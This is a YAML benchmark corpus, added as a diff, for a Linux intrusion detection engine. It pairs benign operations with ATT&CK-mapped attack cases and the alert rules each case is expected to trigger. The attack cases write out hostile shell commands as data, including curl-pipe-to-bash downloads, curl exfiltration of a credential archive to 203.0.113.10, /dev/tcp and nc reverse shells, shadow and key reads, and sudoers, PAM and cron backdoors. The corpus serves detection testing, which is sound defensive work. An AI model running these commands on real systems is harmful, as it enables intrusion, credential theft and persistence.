@@ -1,0 +1,1533 @@
+# xiezhi R4 benchmark corpus.
+# 75 interleaved attack cases (12 ATT&CK tactics) + 3 kill-chain groups (12
+# cases, shared intent buckets) + 15 false-positive ops.
+#
+# Field semantics (frozen; corpus.py parses this subset of YAML):
+#   id              unique case id
+#   tactic          ATT&CK tactic id (TA....)
+#   technique       ATT&CK technique id (hint, not matched by engine)
+#   name            short description (ASCII only)
+#   cmd             shell command. The runner ALWAYS executes it as
+#                   `timeout N setpriv --reuid=UID ... bash -c "<cmd>"`, so
+#                   the full command string lands in one argv element. That is
+#                   the only argv shape in which the per-element regex rules
+#                   and the intent labeler can see multi-token patterns such
+#                   as pipes or flag combinations. Interactive/bare-script
+#                   execution of these commands is NOT what this corpus
+#                   measures.
+#   creates_process true  = attack tool binary ships with stock CentOS 7
+#                   minimal and really execve()s (its own event is expected).
+#                   false = binary missing on minimal (argv-visible
+#                   simulation only) or pure shell builtin (echo redirect,
+#                   history, unset). Both sub-forms stay argv-visible through
+#                   the bash -c wrapper; kernel hooks cannot see them in an
+#                   interactive shell - that is the documented known boundary.
+#   mode            real | sim-missing-bin | sim-builtin (detail for the above)
+#   bin             primary binary probed by the runner (informational)
+#   expected_rules  rule ids expected to alert for THIS case in isolation
+#                   (seed rules are per-event; intent/<tag> appears here only
+#                   when the case alone crosses the 8.0 bucket threshold, or
+#                   for the crossing case of a chain bucket)
+#   intent_tags     labeler tags the command should register (informational;
+#                   tags without a policy score or below 8.0 total never
+#                   alert on their own)
+#   bucket          optional shared intent bucket (kill-chain group). Cases
+#                   sharing a bucket run under one uid so tags accumulate.
+#   expect          detectable  = expected_rules non-empty, a hit is required
+#                   gap         = no rule can fire for this case in isolation
+#                                (coverage hole or below-threshold intent)
+#                   silent      = false-positive op, NO high+ alert allowed
+#
+# Execution order = file order: false_positives first (clean buckets), then
+# interleaved attack cases (round-robin over tactics, keeps same-rule cases
+# apart so the 10 alerts/min/rule engine limiter never clips), then chains.
+
+false_positives:
+  - id: FP01
+    tactic: BENIGN
+    technique: NONE
+    name: restart nginx service
+    cmd: 'systemctl restart nginx'
+    creates_process: true
+    mode: real
+    bin: systemctl
+    expected_rules: []
+    intent_tags:
+      - service_restart
+    expect: silent
+
+  - id: FP02
+    tactic: BENIGN
+    technique: NONE
+    name: check for package updates
+    cmd: 'yum update --assumeno'
+    creates_process: true
+    mode: real
+    bin: yum
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP03
+    tactic: BENIGN
+    technique: NONE
+    name: read system log
+    cmd: 'cat /var/log/messages'
+    creates_process: true
+    mode: real
+    bin: cat
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP04
+    tactic: BENIGN
+    technique: NONE
+    name: local health probe
+    cmd: 'curl --max-time 3 http://localhost/healthz'
+    creates_process: true
+    mode: real
+    bin: curl
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP05
+    tactic: BENIGN
+    technique: NONE
+    name: list processes
+    cmd: 'ps aux'
+    creates_process: true
+    mode: real
+    bin: ps
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP06
+    tactic: BENIGN
+    technique: NONE
+    name: disk usage
+    cmd: 'df -h'
+    creates_process: true
+    mode: real
+    bin: df
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP07
+    tactic: BENIGN
+    technique: NONE
+    name: list tmp directory
+    cmd: 'ls -la /tmp'
+    creates_process: true
+    mode: real
+    bin: ls
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP08
+    tactic: BENIGN
+    technique: NONE
+    name: grep errors in logs
+    cmd: 'grep -r "error" /var/log/'
+    creates_process: true
+    mode: real
+    bin: grep
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP09
+    tactic: BENIGN
+    technique: NONE
+    name: tar backup of config files
+    cmd: 'tar czf /tmp/bench-backup.tar.gz /etc/hostname /etc/hosts'
+    creates_process: true
+    mode: real
+    bin: tar
+    expected_rules: []
+    intent_tags:
+      - data_archive
+    expect: silent
+
+  - id: FP10
+    tactic: BENIGN
+    technique: NONE
+    name: ssh uptime check to internal host
+    cmd: 'ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no user@127.0.0.1 uptime'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: ssh
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP11
+    tactic: BENIGN
+    technique: NONE
+    name: scp copy to backup host
+    cmd: 'scp -o ConnectTimeout=3 /etc/hosts user@127.0.0.1:/tmp/'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: scp
+    expected_rules: []
+    intent_tags:
+      - data_upload
+    expect: silent
+
+  - id: FP12
+    tactic: BENIGN
+    technique: NONE
+    name: git pull
+    cmd: 'git pull'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: git
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP13
+    tactic: BENIGN
+    technique: NONE
+    name: list docker containers
+    cmd: 'docker ps'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: docker
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP14
+    tactic: BENIGN
+    technique: NONE
+    name: service status check
+    cmd: 'systemctl status sshd'
+    creates_process: true
+    mode: real
+    bin: systemctl
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+  - id: FP15
+    tactic: BENIGN
+    technique: NONE
+    name: one-shot top snapshot
+    cmd: 'top -b -n 1'
+    creates_process: true
+    mode: real
+    bin: top
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+
+attacks:
+  # round 1 ------------------------------------------------------------
+  - id: R01
+    tactic: TA0043
+    technique: T1046
+    name: nmap TCP connect scan
+    cmd: 'nmap -sT -p 22,80,443 127.0.0.1'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: nmap
+    expected_rules:
+      - exec-recon-nmap
+    intent_tags:
+      - recon_port_scan
+    expect: detectable
+    severity_hint: medium
+
+  - id: E01
+    tactic: TA0002
+    technique: T1059.004
+    name: curl pipe to bash
+    cmd: 'curl -s --connect-timeout 2 http://203.0.113.10/x.sh | bash'
+    creates_process: true
+    mode: real
+    bin: curl
+    expected_rules:
+      - exec-curl-pipe-shell
+    intent_tags:
+      - download_and_execute
+    expect: detectable
+    severity_hint: high
+
+  - id: P01
+    tactic: TA0003
+    technique: T1053.003
+    name: append root crontab entry
+    cmd: 'echo "* * * * * /tmp/.bench-beacon" >> /var/spool/cron/root'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-persistence-cron-write
+    intent_tags:
+      - persistence_cron
+    expect: detectable
+    severity_hint: high
+
+  - id: V01
+    tactic: TA0004
+    technique: T1548
+    name: sudo su to root
+    cmd: 'sudo su -'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: sudo
+    expected_rules: []
+    intent_tags:
+      - privesc_sudo
+    expect: gap
+    severity_hint: high
+
+  - id: D01
+    tactic: TA0005
+    technique: T1070.003
+    name: clear shell history
+    cmd: 'history -c'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-hist-clear
+    intent_tags:
+      - shell_history_clear
+    expect: detectable
+    severity_hint: medium
+
+  - id: C01
+    tactic: TA0006
+    technique: T1003.008
+    name: read etc shadow
+    cmd: 'cat /etc/shadow'
+    creates_process: true
+    mode: real
+    bin: cat
+    expected_rules:
+      - exec-cred-shadow-read
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+
+  - id: S01
+    tactic: TA0007
+    technique: T1057
+    name: process listing
+    cmd: 'ps aux'
+    creates_process: true
+    mode: real
+    bin: ps
+    expected_rules: []
+    intent_tags: []
+    expect: gap
+    severity_hint: low
+
+  - id: L01
+    tactic: TA0008
+    technique: T1021.004
+    name: ssh remote command exec
+    cmd: 'ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no benchuser@127.0.0.1 id'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: ssh
+    expected_rules: []
+    intent_tags: []
+    expect: gap
+    severity_hint: medium
+
+  - id: A01
+    tactic: TA0009
+    technique: T1560.001
+    name: tar archive of credential files
+    cmd: 'tar czf /tmp/bench-stage.tar.gz /etc/passwd /etc/shadow'
+    creates_process: true
+    mode: real
+    bin: tar
+    expected_rules:
+      - exec-cred-shadow-read
+      - exec-staging-sensitive-tar
+    intent_tags:
+      - data_archive
+    expect: detectable
+    severity_hint: medium
+
+  - id: X01
+    tactic: TA0010
+    technique: T1041
+    name: curl POST exfil to c2
+    cmd: 'curl --connect-timeout 2 -X POST -d @/tmp/bench-stage.tar.gz http://203.0.113.10/up'
+    creates_process: true
+    mode: real
+    bin: curl
+    expected_rules:
+      - exec-exfil-curl-upload
+    intent_tags:
+      - remote_download
+    expect: detectable
+    severity_hint: high
+
+  - id: M01
+    tactic: TA0011
+    technique: T1059.004
+    name: bash reverse shell via dev tcp
+    cmd: 'bash -i >& /dev/tcp/127.0.0.1/9444 0>&1'
+    creates_process: true
+    mode: real
+    bin: bash
+    expected_rules:
+      - intent/reverse_shell
+    intent_tags:
+      - reverse_shell
+    expect: detectable
+    severity_hint: critical
+
+  - id: I01
+    tactic: TA0040
+    technique: T1496
+    name: xmrig miner launch
+    cmd: 'xmrig --donate-level 1 --url stratum+tcp://pool.minexmr.com:3333 --user bench'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: xmrig
+    expected_rules:
+      - exec-miner-config
+      - intent/mining_indicator
+    intent_tags:
+      - mining_indicator
+    expect: detectable
+    severity_hint: critical
+
+  # round 2 ------------------------------------------------------------
+  - id: R02
+    tactic: TA0043
+    technique: T1046
+    name: nmap service version sweep
+    cmd: 'nmap -sS -A 192.168.122.0/24'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: nmap
+    expected_rules:
+      - exec-recon-nmap
+    intent_tags:
+      - recon_port_scan
+    expect: detectable
+    severity_hint: medium
+
+  - id: E02
+    tactic: TA0002
+    technique: T1059.004
+    name: wget pipe to sh
+    cmd: 'wget -q -O - http://203.0.113.10/x.sh | sh'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: wget
+    expected_rules:
+      - exec-curl-pipe-shell
+    intent_tags:
+      - download_and_execute
+      - remote_download
+    expect: detectable
+    severity_hint: high
+
+  - id: P02
+    tactic: TA0003
+    technique: T1053.003
+    name: install attacker crontab
+    cmd: 'crontab /tmp/.bench-evil-cron'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: crontab
+    expected_rules:
+      - exec-persistence-cron-write
+    intent_tags:
+      - persistence_cron
+    expect: detectable
+    severity_hint: high
+
+  - id: V02
+    tactic: TA0004
+    technique: T1548
+    name: find suid binaries
+    cmd: 'find / -perm -4000 -type f 2>/dev/null'
+    creates_process: true
+    mode: real
+    bin: find
+    expected_rules:
+      - exec-setuid-discovery
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: D02
+    tactic: TA0005
+    technique: T1070.003
+    name: disable history file
+    cmd: 'unset HISTFILE'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-hist-clear
+    intent_tags:
+      - shell_history_clear
+    expect: detectable
+    severity_hint: medium
+
+  - id: C02
+    tactic: TA0006
+    technique: T1552.004
+    name: read root ssh private key
+    cmd: 'cat /root/.ssh/id_rsa'
+    creates_process: true
+    mode: real
+    bin: cat
+    expected_rules:
+      - exec-cred-material-read
+    intent_tags:
+      - cred_material_read
+    expect: detectable
+    severity_hint: high
+
+  - id: S02
+    tactic: TA0007
+    technique: T1049
+    name: netstat connection listing
+    cmd: 'netstat -antp'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: netstat
+    expected_rules:
+      - exec-recon-netstat
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: L02
+    tactic: TA0008
+    technique: T1090
+    name: ssh remote port forward tunnel
+    cmd: 'ssh -o ConnectTimeout=2 -R 9999:127.0.0.1:80 benchuser@127.0.0.1'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: ssh
+    expected_rules:
+      - exec-lateral-ssh-forward
+    intent_tags:
+      - tunnel_setup
+    expect: detectable
+    severity_hint: high
+
+  - id: A02
+    tactic: TA0009
+    technique: T1005
+    name: find config files for staging
+    cmd: 'find /etc -name "*.conf" > /tmp/bench-conf-list.txt 2>/dev/null'
+    creates_process: true
+    mode: real
+    bin: find
+    expected_rules:
+      - exec-staging-config-find
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: X02
+    tactic: TA0010
+    technique: T1041
+    name: curl upload put exfil
+    cmd: 'curl --connect-timeout 2 -T /tmp/bench-stage.tar.gz http://203.0.113.10/up'
+    creates_process: true
+    mode: real
+    bin: curl
+    expected_rules:
+      - exec-exfil-curl-upload
+    intent_tags:
+      - data_upload
+      - remote_download
+    expect: detectable
+    severity_hint: high
+
+  - id: M02
+    tactic: TA0011
+    technique: T1059.004
+    name: nc -e reverse shell
+    cmd: 'nc -e /bin/bash 127.0.0.1 9444'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: nc
+    expected_rules:
+      - intent/reverse_shell
+    intent_tags:
+      - reverse_shell
+    expect: detectable
+    severity_hint: critical
+
+  - id: I02
+    tactic: TA0040
+    technique: T1496
+    name: write stratum pool config
+    cmd: 'echo "stratum+tcp://nanopool.org:3333" > /tmp/bench-pool.conf'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-miner-config
+      - intent/mining_indicator
+    intent_tags:
+      - mining_indicator
+    expect: detectable
+    severity_hint: critical
+
+  # round 3 ------------------------------------------------------------
+  - id: R03
+    tactic: TA0043
+    technique: T1595
+    name: masscan subnet sweep
+    cmd: 'masscan 10.0.0.0/24 -p 22,80 --rate=1000'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: masscan
+    expected_rules:
+      - exec-masscan
+    intent_tags:
+      - recon_port_scan
+    expect: detectable
+    severity_hint: medium
+
+  - id: E03
+    tactic: TA0002
+    technique: T1059.006
+    name: python one-liner exec
+    cmd: 'python2 -c ''import os; os.system("id")'''
+    creates_process: true
+    mode: real
+    bin: python2
+    expected_rules:
+      - exec-interp-inline-code
+    intent_tags:
+      - interpreter_one_liner
+    expect: detectable
+    severity_hint: medium
+
+  - id: P03
+    tactic: TA0003
+    technique: T1547
+    name: rc.local persistence entry
+    cmd: 'echo "/tmp/.bench-beacon &" >> /etc/rc.local'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-persistence-rc-local
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+
+  - id: V03
+    tactic: TA0004
+    technique: T1548
+    name: list file capabilities
+    cmd: 'getcap -r / 2>/dev/null'
+    creates_process: true
+    mode: real
+    bin: getcap
+    expected_rules:
+      - exec-setuid-discovery
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: D03
+    tactic: TA0005
+    technique: T1070.003
+    name: delete root bash history
+    cmd: 'rm -f /root/.bash_history'
+    creates_process: true
+    mode: real
+    bin: rm
+    expected_rules:
+      - exec-hist-clear
+    intent_tags:
+      - shell_history_clear
+    expect: detectable
+    severity_hint: medium
+
+  - id: C03
+    tactic: TA0006
+    technique: T1552.001
+    name: find pem key files
+    cmd: 'find / -name "*.pem" 2>/dev/null'
+    creates_process: true
+    mode: real
+    bin: find
+    expected_rules:
+      - exec-cred-material-read
+    intent_tags:
+      - cred_material_read
+    expect: detectable
+    severity_hint: medium
+
+  - id: S03
+    tactic: TA0007
+    technique: T1049
+    name: ss socket listing
+    cmd: 'ss -tulnp'
+    creates_process: true
+    mode: real
+    bin: ss
+    expected_rules:
+      - exec-recon-netstat
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: L03
+    tactic: TA0008
+    technique: T1021
+    name: scp copy to other host
+    cmd: 'scp -o ConnectTimeout=2 /etc/hosts benchuser@127.0.0.1:/tmp/'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: scp
+    expected_rules: []
+    intent_tags:
+      - data_upload
+    expect: gap
+    severity_hint: medium
+
+  - id: L04
+    tactic: TA0008
+    technique: T1552.004
+    name: ssh-keygen for lateral movement key
+    cmd: 'ssh-keygen -t ed25519 -N "" -f /tmp/bench-key'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: ssh-keygen
+    expected_rules:
+      - exec-cred-keygen-staging
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: A03
+    tactic: TA0009
+    technique: T1005
+    name: mysqldump database
+    cmd: 'mysqldump -u root --all-databases'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: mysqldump
+    expected_rules:
+      - exec-dump-database
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+
+  - id: X03
+    tactic: TA0010
+    technique: T1048
+    name: scp archive out to attacker
+    cmd: 'scp -o ConnectTimeout=2 /tmp/bench-stage.tar.gz benchuser@203.0.113.10:/tmp/'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: scp
+    expected_rules:
+      - exec-exfil-archive-remote
+    intent_tags:
+      - data_upload
+    expect: detectable
+    severity_hint: high
+
+  - id: M03
+    tactic: TA0011
+    technique: T1095
+    name: python socket beacon connect
+    cmd: 'python2 -c ''import socket; s=socket.create_connection(("127.0.0.1",9444))'''
+    creates_process: true
+    mode: real
+    bin: python2
+    expected_rules:
+      - exec-interp-inline-code
+      - exec-python-socket-c2
+    intent_tags:
+      - interpreter_one_liner
+    expect: detectable
+    severity_hint: high
+
+  - id: I03
+    tactic: TA0040
+    technique: T1485
+    name: recursive delete in tmp target dir
+    cmd: 'rm -rf /tmp/bench-impact-dir'
+    creates_process: true
+    mode: real
+    bin: rm
+    expected_rules: []
+    intent_tags: []
+    expect: gap
+    severity_hint: critical
+
+  # round 4 ------------------------------------------------------------
+  - id: R04
+    tactic: TA0043
+    technique: T1595
+    name: zgrab banner grab
+    cmd: 'zgrab --port 443 --http / 10.0.0.5'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: zgrab
+    expected_rules:
+      - exec-masscan
+    intent_tags:
+      - recon_port_scan
+    expect: detectable
+    severity_hint: medium
+
+  - id: E04
+    tactic: TA0002
+    technique: T1059.004
+    name: perl one-liner exec
+    cmd: 'perl -e "system(\"id\")"'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: perl
+    expected_rules:
+      - exec-interp-inline-code
+    intent_tags:
+      - interpreter_one_liner
+    expect: detectable
+    severity_hint: medium
+
+  - id: P04
+    tactic: TA0003
+    technique: T1136.001
+    name: useradd backdoor account
+    cmd: 'useradd -m -s /bin/bash benchsvc99'
+    creates_process: true
+    mode: real
+    bin: useradd
+    expected_rules:
+      - exec-user-creation
+    intent_tags:
+      - user_creation
+    expect: detectable
+    severity_hint: high
+
+  - id: V04
+    tactic: TA0004
+    technique: T1548.001
+    name: setcap setuid capability
+    cmd: 'setcap cap_setuid+ep /tmp/.bench-beacon'
+    creates_process: true
+    mode: real
+    bin: setcap
+    expected_rules:
+      - exec-cap-grant-priv
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+
+  - id: D04
+    tactic: TA0005
+    technique: T1562.002
+    name: delete audit log file
+    cmd: 'rm -f /var/log/audit/audit.log.1'
+    creates_process: true
+    mode: real
+    bin: rm
+    expected_rules:
+      - exec-auditd-tamper
+    intent_tags:
+      - audit_log_tamper
+    expect: detectable
+    severity_hint: high
+
+  - id: C04
+    tactic: TA0006
+    technique: T1552.001
+    name: grep for aws secrets
+    cmd: 'grep -rl "AWS_SECRET_ACCESS_KEY" /root/ /home/ 2>/dev/null'
+    creates_process: true
+    mode: real
+    bin: grep
+    expected_rules:
+      - exec-cred-secret-pattern
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+
+  - id: S04
+    tactic: TA0007
+    technique: T1083
+    name: list staging directories
+    cmd: 'ls -la /tmp /var/tmp /dev/shm'
+    creates_process: true
+    mode: real
+    bin: ls
+    expected_rules:
+      - exec-tmp-enumerate
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: A04
+    tactic: TA0009
+    technique: T1005
+    name: pg_dump database
+    cmd: 'pg_dump -U postgres benchdb'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: pg_dump
+    expected_rules:
+      - exec-dump-database
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+
+  - id: X04
+    tactic: TA0010
+    technique: T1027
+    name: base64 decode into curl post
+    cmd: 'echo aGVsbG8= | base64 -d | curl --connect-timeout 2 -X POST -d @- http://203.0.113.10/'
+    creates_process: true
+    mode: real
+    bin: base64
+    expected_rules:
+      - exec-exfil-curl-upload
+    intent_tags:
+      - obfuscated_payload
+    expect: detectable
+    severity_hint: high
+
+  - id: M04
+    tactic: TA0011
+    technique: T1071.001
+    name: cloudflared quick tunnel
+    cmd: 'cloudflared tunnel --url http://127.0.0.1:80'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: cloudflared
+    expected_rules:
+      - exec-tunnel-cloudflare
+    intent_tags:
+      - tunnel_setup
+    expect: detectable
+    severity_hint: high
+
+  - id: I04
+    tactic: TA0040
+    technique: T1485
+    name: dd zero fill to tmp image
+    cmd: 'dd if=/dev/zero of=/tmp/bench-dd.img bs=1M count=4'
+    creates_process: true
+    mode: real
+    bin: dd
+    expected_rules: []
+    intent_tags: []
+    expect: gap
+    severity_hint: critical
+
+  # round 5 ------------------------------------------------------------
+  - id: R05
+    tactic: TA0043
+    technique: T1592
+    name: dig zone transfer
+    cmd: 'dig AXFR target-corp.internal @10.0.0.53'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: dig
+    expected_rules:
+      - exec-recon-axfr-dns
+    intent_tags: []
+    expect: detectable
+    severity_hint: medium
+
+  - id: E05
+    tactic: TA0002
+    technique: T1059
+    name: php -r webshell style exec
+    cmd: 'php -r "echo 1;"'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: php
+    expected_rules:
+      - exec-interp-inline-code
+    intent_tags: []
+    expect: detectable
+    severity_hint: medium
+
+  - id: P05
+    tactic: TA0003
+    technique: T1053.003
+    name: append to etc crontab
+    cmd: 'echo "0 * * * * root /tmp/.bench-beacon" >> /etc/crontab'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-persistence-cron-write
+    intent_tags:
+      - persistence_cron
+    expect: detectable
+    severity_hint: high
+
+  - id: V05
+    tactic: TA0004
+    technique: T1548.003
+    name: sudoers drop-in write
+    cmd: 'echo "bench ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/bench'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-sudoers-write
+    intent_tags: []
+    expect: detectable
+    severity_hint: critical
+
+  - id: D05
+    tactic: TA0005
+    technique: T1562.001
+    name: stop auditd service
+    cmd: 'systemctl stop auditd'
+    creates_process: true
+    mode: real
+    bin: systemctl
+    expected_rules:
+      - exec-auditd-tamper
+    intent_tags:
+      - audit_log_tamper
+      - service_restart
+    expect: detectable
+    severity_hint: high
+
+  - id: C05
+    tactic: TA0006
+    technique: T1056
+    name: dump init process environ
+    cmd: 'cat /proc/1/environ'
+    creates_process: true
+    mode: real
+    bin: cat
+    expected_rules:
+      - exec-cred-proc-environ
+    intent_tags:
+      - proc_environ_dump
+    expect: detectable
+    severity_hint: medium
+
+  - id: S05
+    tactic: TA0007
+    technique: T1087.001
+    name: read etc passwd
+    cmd: 'cat /etc/passwd'
+    creates_process: true
+    mode: real
+    bin: cat
+    expected_rules:
+      - exec-system-discovery
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: A05
+    tactic: TA0009
+    technique: T1132
+    name: base64 encode collected secret
+    cmd: 'echo bench-secret-data | base64'
+    creates_process: true
+    mode: real
+    bin: base64
+    expected_rules: []
+    intent_tags: []
+    expect: gap
+    severity_hint: low
+
+  - id: M05
+    tactic: TA0011
+    technique: T1071.001
+    name: ngrok http tunnel
+    cmd: 'ngrok http 8080'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: ngrok
+    expected_rules:
+      - exec-tunnel-cloudflare
+    intent_tags:
+      - tunnel_setup
+    expect: detectable
+    severity_hint: high
+
+  # round 6 ------------------------------------------------------------
+  - id: R06
+    tactic: TA0043
+    technique: T1592
+    name: nslookup mx recon
+    cmd: 'nslookup -type=MX target-corp.com 8.8.8.8'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: nslookup
+    expected_rules:
+      - exec-recon-axfr-dns
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: E06
+    tactic: TA0002
+    technique: T1059.004
+    name: ruby one-liner exec
+    cmd: 'ruby -e "puts 1"'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: ruby
+    expected_rules:
+      - exec-interp-inline-code
+    intent_tags:
+      - interpreter_one_liner
+    expect: detectable
+    severity_hint: medium
+
+  - id: P06
+    tactic: TA0003
+    technique: T1098.004
+    name: append attacker ssh authorized key
+    cmd: 'echo "ssh-rsa AAAAB3bench" >> /root/.ssh/authorized_keys'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-cred-material-read
+      - intent/ssh_authorized_key_write
+    intent_tags:
+      - ssh_authorized_key_write
+      - cred_material_read
+    expect: detectable
+    severity_hint: critical
+
+  - id: D06
+    tactic: TA0005
+    technique: T1562.001
+    name: chattr immutable on target file
+    cmd: 'chattr +i /tmp/bench-immutable-test'
+    creates_process: true
+    mode: real
+    bin: chattr
+    expected_rules:
+      - exec-chattr-immutable
+    intent_tags: []
+    expect: detectable
+    severity_hint: medium
+
+  - id: C06
+    tactic: TA0006
+    technique: T1552.001
+    name: read mysql client credentials
+    cmd: 'cat /root/.my.cnf'
+    creates_process: true
+    mode: real
+    bin: cat
+    expected_rules:
+      - exec-db-config-read
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+
+  - id: S06
+    tactic: TA0007
+    technique: T1082
+    name: identity and kernel probe
+    cmd: 'id && uname -a'
+    creates_process: true
+    mode: real
+    bin: id
+    expected_rules:
+      - exec-system-discovery
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: M06
+    tactic: TA0011
+    technique: T1090.003
+    name: connect to tor socks port
+    cmd: 'exec 3<>/dev/tcp/127.0.0.1/9050'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - conn-tor-ports
+      - intent/reverse_shell
+    intent_tags:
+      - reverse_shell
+    expect: detectable
+    severity_hint: medium
+
+  # round 7 ------------------------------------------------------------
+  - id: R07
+    tactic: TA0043
+    technique: T1046
+    name: traceroute network path
+    cmd: 'traceroute -n 10.0.0.1'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: traceroute
+    expected_rules:
+      - exec-recon-net-probe
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  - id: E07
+    tactic: TA0002
+    technique: T1059
+    name: lua one-liner exec
+    cmd: 'lua -e "print(1)"'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: lua
+    expected_rules:
+      - exec-interp-inline-code
+    intent_tags: []
+    expect: detectable
+    severity_hint: medium
+
+  - id: P07
+    tactic: TA0003
+    technique: T1543.002
+    name: enable malicious systemd unit
+    cmd: 'systemctl enable bench-beacon.service'
+    creates_process: true
+    mode: real
+    bin: systemctl
+    expected_rules:
+      - exec-persistence-systemd-enable
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+
+  - id: D07
+    tactic: TA0005
+    technique: T1040
+    name: short traffic capture with timeout
+    cmd: 'timeout 5 tcpdump -i any -w /tmp/bench-cap.pcap'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: tcpdump
+    expected_rules:
+      - exec-sniffer-run
+    intent_tags: []
+    expect: detectable
+    severity_hint: medium
+
+  - id: C07
+    tactic: TA0006
+    technique: T1552.001
+    name: read aws credentials file
+    cmd: 'cat /root/.aws/credentials'
+    creates_process: true
+    mode: real
+    bin: cat
+    expected_rules:
+      - exec-cred-secret-pattern
+      - exec-cred-material-read
+    intent_tags:
+      - cred_material_read
+    expect: detectable
+    severity_hint: high
+
+  - id: S07
+    tactic: TA0007
+    technique: T1497.001
+    name: disk and mount overview
+    cmd: 'df -h && mount'
+    creates_process: true
+    mode: real
+    bin: df
+    expected_rules: []
+    intent_tags: []
+    expect: gap
+    severity_hint: low
+
+  # round 8 ------------------------------------------------------------
+  - id: R08
+    tactic: TA0043
+    technique: T1046
+    name: nc port knock scan
+    cmd: 'nc -z -w 1 127.0.0.1 22 80 443'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: nc
+    expected_rules:
+      - exec-recon-net-probe
+    intent_tags: []
+    expect: detectable
+    severity_hint: medium
+
+  - id: E08
+    tactic: TA0002
+    technique: T1105
+    name: echo payload into nc
+    cmd: 'echo "bench-payload" | nc -w 1 127.0.0.1 9999'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: nc
+    expected_rules:
+      - exec-recon-net-probe
+    intent_tags: []
+    expect: detectable
+    severity_hint: medium
+
+  - id: P08
+    tactic: TA0003
+    technique: T1556
+    name: pam backdoor insert
+    cmd: 'echo "auth sufficient bench_pam.so" >> /etc/pam.d/su'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-persistence-pam-write
+    intent_tags: []
+    expect: detectable
+    severity_hint: critical
+
+  - id: C08
+    tactic: TA0006
+    technique: T1552.005
+    name: cloud metadata credential fetch
+    cmd: 'curl --connect-timeout 2 http://100.100.100.200/latest/meta-data/'
+    creates_process: true
+    mode: real
+    bin: curl
+    expected_rules:
+      - exec-cred-metadata-fetch
+    intent_tags:
+      - cloud_credential_read
+    expect: detectable
+    severity_hint: critical
+
+  - id: S08
+    tactic: TA0007
+    technique: T1613
